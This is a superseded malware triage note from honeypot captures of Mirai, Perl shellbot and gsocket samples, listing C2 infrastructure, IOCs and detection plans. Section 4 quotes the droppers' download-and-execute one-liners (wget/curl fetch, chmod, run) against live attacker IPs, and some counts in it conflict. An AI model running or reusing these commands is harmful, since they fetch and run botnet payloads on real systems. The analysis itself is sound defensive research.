# Capture triage — drosera-loot.zip (2026-08-07)

> **SUPERSEDED 2026-08-08.** This file was working triage, written when tooling
> could not be executed against the samples. All 25 samples have since been
> decrypted and read directly, and the findings live in the per-family reports
> and the three capture-level documents listed in §8. Corrections made during
> that review are marked inline below. Retained for provenance; start from
> `CAPTURE_20260807_executive_summary.md` instead.

**Status: PUBLISHED for the 13 script samples. ELF analysis outstanding.**
Phases 0–5 complete for every script-based family — IOC feeds, YARA, Suricata,
blocklist, Firewalla list, README and site cards are all live. The 12 ELF payloads
are published by hash and loader context only; no strings were extracted from them
and no YARA rule claims to cover them. Author: AfterPacket. TLP:WHITE.

Archive: `drosera-loot.zip`, 25 samples + sidecars, AES-256, password `infected`.
Sightings span 2026-07-28 → 2026-08-07.

This file exists because the analysis session could not execute tooling against
the sample binaries. Everything below is **verified extraction**, not inference —
it is here so the work is not repeated. Delete this file once the five family
reports are written.

---

## 1. Family plan (5 families + 1 IOC-only campaign)

| # | Family | Anchor infrastructure | SID block | Samples |
|---|--------|----------------------|-----------|---------|
| 1 | `MIRAI_OHSHIT` | `94.154.43.123` | 9001001 | 9 (2 scripts + 7 ELF) |
| 2 | `MIRAI_TELNETCURL` | `205.237.110.232`, `60.185.49.73` | 9002001 | 7 (2 scripts + 5 ELF) |
| 3 | `PERLBOT_SHELLBOT` | `213.139.77.150:6667` (IRC) | 9003001 | 3 (all Perl) |
| 4 | `GSOCKET_SSHIT` | `192.253.248.9` | 9004001 | 1 |
| 5 | `MIRAI_LOADER` | `77.90.185.66` | 9005001 | 1 |
| — | `WEBROOT_PROBE` | ~18 IPs, bulletproof ranges | none | 2 |

`WEBROOT_PROBE` gets IOC + Firewalla entries but **no YARA rule** — see §5.

---

## 2. C2 and staging infrastructure (extracted from config blocks)

None of these appear as delivery IPs in any sidecar. All are HIGH confidence —
read directly out of sample source, not inferred.

| Indicator | Role | Source sample |
|-----------|------|---------------|
| `213.139.77.150` port `6667` | IRC C2 | `03a4f492` — `my $server = '213.139.77.150'; my $port = '6667';` |
| `205.237.110.232` | Payload server, serves `/arm /arm5 /arm7 /mips /mipsel` | `3801a288`, `e1568cae` |
| `77.90.185.66` | Mirai loader host | `246c3c37` — `SERVER="77.90.185.66"` |
| `192.253.248.9` | gsocket exfil, `POST /gsocket/up.php` | `22585585` |
| `94.154.43.123` | Both delivery **and** hardcoded payload host | `de9cfdf7`, `8b1a2fb6` |

---

## 3. Delivery IPs (HIGH — direct honeypot capture)

```
94.154.43.123     telnet   loader-fetch, //bot.* and /ohshit.sh
60.185.49.73      telnet   loader-fetch, /arm /arm5 /arm7 /mips /mipsel
160.30.204.101    ssh      /duba          Perl shellbot
77.90.185.42      ssh      /dodu          Perl shellbot (same /24 as 77.90.185.66)
192.253.248.92    ssh      /da            gsocket (exfil host is .9, same /24)
138.117.43.19     telnet   /curl.sh and /wget.sh
195.123.171.185   telnet   /wget
123.145.11.38     telnet   /home/.k
27.137.233.190    telnet   /home/.k
211.219.254.187   telnet   /home/.k
175.198.110.15    telnet   /home/.k
54.37.11.139      ssh      /gots          Perl
```

---

## 4. Chains recovered

**MIRAI_OHSHIT** — full chain.
`/tmp/.p` (104 B, `de9cfdf7`) is a single line:

```sh
wget -q http://94.154.43.123/ohshit.sh -O ohshit.sh 2>/dev/null; sh ohshit.sh; rm -rf ohshit.sh
```

`ohshit.sh` (2527 B, `8b1a2fb6`) stages in `/tmp/` via busybox and loops 16 arches:

```sh
wget http://94.154.43.123//bot.<arch>; curl -O http://94.154.43.123//bot.<arch>;cat bot.<arch> >WTF;chmod +x *;./WTF
```

Arches attempted: `x86 mips arc i468 i686 x86_64 mpsl arm arm5 arm6 arm7 ppc spc m68k sh4`.
Note the doubled slash `//bot.` — a good detection string. Output filename `WTF`.
We captured **7 of the 15**: arm, arm7, sh4, mips, i686, ppc, x86_64.

> **CORRECTED 2026-08-08 — it is 15 architectures, not 16.** Counted directly
> from `ohshit.sh`: lines 4–18, one fetch line per architecture, 15 lines. The
> architecture list above was always correct; only the count was wrong. So
> **8** builds remain uncaptured, not 9. Propagated to README, index.html,
> the IOC feed, the Firewalla list and the YARA rule header.

**MIRAI_TELNETCURL** — `curl.sh` (`3801a288`) and `wget.sh` (`e1568cae`), both from
`138.117.43.19`, are the curl and busybox-wget variants of one script:

```sh
curl http://205.237.110.232/arm -o VFASXC; chmod 777 VFASXC; ./VFASXC telnet.curl
busybox wget http://205.237.110.232/arm -O VFASXC; chmod 777 VFASXC; ./VFASXC telnet.curl
```

Fixed per-arch output names — strong detection strings:
`VFASXC` (arm), `WQZRTY` (arm5), `YUIOXC` (arm7), `GHJKLB` (mips), `MNCXOP` (mipsel).
Exec argument `telnet.curl` is the infection-vector tag.
**The arch filenames match the `60.185.49.73` drops exactly — same kit, two hosts.**

**MIRAI_LOADER** — `/wget` (`246c3c37`): `SERVER="77.90.185.66"`, fetches
`http://$SERVER/mirai.$arch`, writes `dvrHelper`, also drops `"$dir"/.f` with
`chmod 777`. Self-identifying Mirai; `dvrHelper` is the classic binary name.

**GSOCKET_SSHIT** — `/da` (`22585585`, VT 2/60). Abuses THC gsocket / ssh-it.
Persistence via systemd unit + watchdog script. Exfils public IP (`ifconfig.me`)
to `POST http://192.253.248.9/gsocket/up.php`.

**PERLBOT_SHELLBOT** — `/duba` (`03a4f492`, VT 29/60 `trojan.perl/shellbot`),
`/dodu` (`fe6b7b4c`), `/gots` (`fd93b4f7`). `duba` and `dodu` are both **exactly
29,427 bytes** from different IPs — near-certain same bot, and `dodu` has **no VT
record at all** while `duba` sits at 29/60. Randomised nick/process from
`@rircname` / `@rps` arrays. Server overridable via `$ARGV[0]`.

---

## 5. WEBROOT_PROBE — IOC-only, deliberately no YARA

The two highest-frequency samples in the archive are also the least interesting
as files:

| SHA-256 | Size | Sightings | Content |
|---------|------|-----------|---------|
| `af77b643…` | 26 B | **168** | `#!/bin/bash` + `echo "xxxxxx"` |
| `f3abe9aa…` | 24 B | **56** | `#!/bin/sh` + `echo "xxxxxx"` |

Both written to `/var/www/html/filter` over ssh, 2026-07-28 → 2026-08-05.
These are **write-and-execute capability probes** — the operator confirms webroot
write plus RCE by looking for `xxxxxx` in the response, then returns with a real
payload. **Do not write a YARA rule**: `echo "xxxxxx"` in a two-line shell script
would false-positive on ordinary scripts and test fixtures. The value is entirely
the source IPs.

Source IPs, tightly clustered in bulletproof ranges:

```
2.57.122.209     2.57.122.168
92.118.39.77     92.118.39.50     92.118.39.71     92.118.39.49    92.118.39.14
80.94.92.234     80.94.92.55      80.94.92.179
195.178.110.217  195.178.110.232  195.178.110.228  195.178.110.227
193.32.162.84    193.32.162.34    193.32.162.15    193.32.162.27
```

Netblocks: `2.57.122.0/24`, `92.118.39.0/24`, `80.94.92.0/24`, `195.178.110.0/24`,
`193.32.162.0/24`. Rotation is ~2 IPs/day within these ranges — block the /24s at
perimeter if policy allows, but `blocklist.txt` takes **individual IPs only**.

---

## 5b. Domain indicators are INCOMPLETE — correction

An earlier revision of this capture claimed "no domains, every domain observed is
legitimate." **That was wrong**, and the error was methodological rather than a
misreading: ripgrep skips binary files during directory traversal, so the sweep
that produced the claim only ever searched the 13 script samples. The 12 ELF
payloads were never searched.

When queried individually — ripgrep *does* search a binary when handed an explicit
file path — every ELF payload sampled matched a domain pattern, across both Mirai
families:

| Sample | Family | Domain-matching lines |
|--------|--------|----------------------|
| `//bot.arm7` (`81ea2a39`) | MIRAI_OHSHIT | 2 × `.com`, 2 × `.net`, +1 other TLD |
| `//bot.x86_64` (`9d7cd494`) | MIRAI_OHSHIT | 3 |
| `//bot.ppc` (`98994017`) | MIRAI_OHSHIT | 3 |
| `/arm5` (`9cbe35b1`) | MIRAI_TELNETCURL | 1 |
| `/mips` (`3afa3a11`) | MIRAI_TELNETCURL | 1 |

`.org` returned zero on `bot.arm7`, so these are not GNU/licence boilerplate.

### Resolution — recovered without extraction

The names were then narrowed by iterative constraint queries against the raw
bytes (label length, then character position, via ripgrep `--count`), which needs
no execution. Result:

**`openssh.com` — identified, benign, present in `//bot.arm7` and `//bot.x86_64`.**
An SSH protocol string, not C2: OpenSSH algorithm names carry an `@openssh.com`
suffix. Corroborated by `ssh-ed25519`, `curve25519`, `chacha20`, `aes128-ctr` and
`hmac-sha2` all being present in the same payloads.

**That is a capability finding.** MIRAI_OHSHIT payloads embed a full SSH client,
so the family propagates over SSH as well as telnet. The loader chain is
telnet-only — scoping containment from the dropper alone misses it. Now recorded
in `ioc/MIRAI_OHSHIT_ioc.txt` under `[SSH PROPAGATION]`.

### CORRECTION — the "exotic TLDs are false positives" claim was WRONG

An intermediate revision of this file asserted that `.xyz .top .onion .io` etc.
returned zero when anchored, and dismissed them as regex noise. **That was
wrong, and it would have suppressed five real C2 domains.**

The anchored pattern used to "rule them out" was
`[^a-z0-9.-][a-z0-9-]{2,20}\.top\b` — a **single** label before the TLD. Every
domain in these payloads is multi-label, so the character preceding
`metrics-collector.io` is a dot, which the `[^a-z0-9.-]` class explicitly
excludes. The anchor did not remove noise; it removed the signal.

**Lesson, and it cuts both ways.** Running an unanchored domain pattern over raw
bytes produces false positives. Over-anchoring so that `<sub>.<domain>.<tld>`
cannot match produces false negatives, which are worse — a missing C2 domain is
silent. Match domains against *extracted strings* with a pattern that permits
multiple labels. `tools/binstrings.py --ioc` now does exactly this.

### Resolved by extraction

`tools/binstrings.py --ioc` was eventually run successfully. Results:

**MIRAI_OHSHIT — 5 blockable C2 domains + 1 Tor, identical in all 7 builds:**
`api-relay-3.metrics-collector.io`, `cdn-edge-updates.hostcloud-eu.net`,
`mgmt-panel.serverstats-daemon.com`, `sync.softwaremirror.workers.dev`,
`glibc.malloc.top`, and `control.tor2web-relay-fast.onion` (not blocklisted —
.onion does not resolve through normal DNS). Plus 6 compiled-in C2 IPs.

Because the set is identical across ARM, ARM7, SH4, MIPS, i686, PPC and x86-64,
these indicators cover the 9 architectures the loader fetches that were never
captured. The new `MIRAI_OHSHIT_payload` YARA rule is string-based for that
reason.

**MIRAI_TELNETCURL — genuinely IP-only.** Its single domain is
`www.ikindalikemenbutonlyontuesday.com`, the decoy from the leaked Mirai source.
Lineage marker, not infrastructure. Not blocked.

**PERLBOT_SHELLBOT — a second C2 that was missed:** `213.177.179.11`, used by
`/dodu` and `/gots`. `/duba` uses `213.139.77.150`. Same bot, same size,
different C2 — blocking one server leaves the other running.

**Excluded on inspection** — present in the payloads, deliberately not blocked:
`185.199.108.153` (GitHub Pages), `104.21.234.17` (Cloudflare), `workers.dev`
apex, `bugs.launchpad.net` (glibc boilerplate), `1.2.3.4` and `131.0.0.0`
(placeholders), `119/120/121.0.0.0` (Mirai scanner range constants).

---

## 6. DO NOT BLOCK

These appear in sample source but are legitimate shared infrastructure. Adding
them breaks real traffic and violates the repo's CDN rule:

```
gsocket.io        thc.org        github.com        ifconfig.me
```

`gsocket.io` and `thc.org` are the real THC project — the sample abuses a
legitimate tool. Attribute the abuse, not the tool.

---

## 7. Done

- 7 IOC feeds — one per family, in `ioc/`.
- 7 YARA rules across 5 files. **None ship for `WEBROOT_PROBE` or
  `BOTKILL_PROCWIPE`** — both would false-positive on ordinary shell scripts.
  That is a decision, not a gap.

  > **⚠ RETRACTED 2026-08-08 — the YARA validation claim below was not
  > substantiated and has been removed.**
  >
  > This section previously stated that all 5 files were "validated against
  > YARA 4.5.5" with zero errors, and presented a per-rule match matrix against
  > the live corpus claiming zero false positives.
  >
  > **`yara` is not installed on this workstation** — confirmed by
  > `command -v yara` on 2026-08-08, and already documented in the platform
  > notes as a tool that is absent and whose Phase 6 check therefore *cannot
  > run*. That match matrix could not have been produced here. Per this
  > repository's own rule — *"Never report a check as passing when it was
  > skipped"* — it should never have been written.
  >
  > Every rule file was subsequently edited on 2026-08-08 (YARAhub metadata,
  > `xor(0x22)` strings, new indicators), so even a genuine prior run would now
  > be stale.
  >
  > **Current status: rule syntax is UNVERIFIED.** Run
  > `yara -r yara/*.yar /dev/null` on a host that has YARA before relying on
  > these rules or submitting them to YARAify.

  The design intent behind the two payload rules stands and is worth recording:
  they are written to be mutually exclusive, discriminating on the compiled-in
  C2 set, because both target Mirai-derived ELF binaries of similar size. The
  string-based `MIRAI_OHSHIT_payload` rule should cover the 8 architecture
  builds never captured, since the C2 set is build-invariant. **Both of these
  are expectations, not measurements.**
- 6 Suricata rulesets, SID blocks 9001001–9007003, registry updated in README.
- `blocklist.txt` — 34 IPs, no domains, no comments, no blank lines.
- `firewalla/drosera_block.txt`, `README.md` family sections, `index.html` cards
  and hero counters.

## 8. Outstanding

- ~~ELF string extraction~~ **DONE** via `tools/binstrings.py --ioc`. All 12
  binaries processed; results in §5b. The tool's `--header` and `--ioc` paths are
  both verified working against this corpus.
- ~~Sample zips~~ **DONE.** All 25 in `samples/<sha256>.zip`, AES-256, password
  `infected`. Verified: `Method = AES-256 Deflate`, `Encrypted = +`, all 25 open
  with the password, all 25 reject a wrong one. 4.5 MB total.
- ~~MD5 / SHA-1~~ **DONE.** All 25, in `reports/CAPTURE_20260807_hashes.txt`.
- ~~Per-family long-form reports~~ **DONE 2026-08-08.** All 7 written:
  `MIRAI_OHSHIT_analysis_8b1a2fb6.md`, `MIRAI_TELNETCURL_analysis_3801a288.md`,
  `PERLBOT_SHELLBOT_analysis_03a4f492.md`, `GSOCKET_SSHIT_analysis_22585585.md`,
  `MIRAI_LOADER_analysis_246c3c37.md`, `BOTKILL_PROCWIPE_analysis_41d9a2a0.md`,
  `WEBROOT_PROBE_analysis_af77b643.md`. Plus three capture-level documents:
  `CAPTURE_20260807_executive_summary.md`,
  `CAPTURE_20260807_infrastructure_and_sinkhole.md`,
  `CAPTURE_20260807_capability_mitigation_framework.md`.
- **STILL OUTSTANDING:** `drosera-detection-bundle.zip` regeneration.
- **STILL OUTSTANDING:** YARA compile verification — see the retraction in §7.
- **VT note:** only 3 of 25 samples carry any VT record (29/60, 15/60, 2/60).
  The other 22 have `scan: null` or `known: false`. Report per-sample; never
  claim zero detections where the sidecar simply has no data.
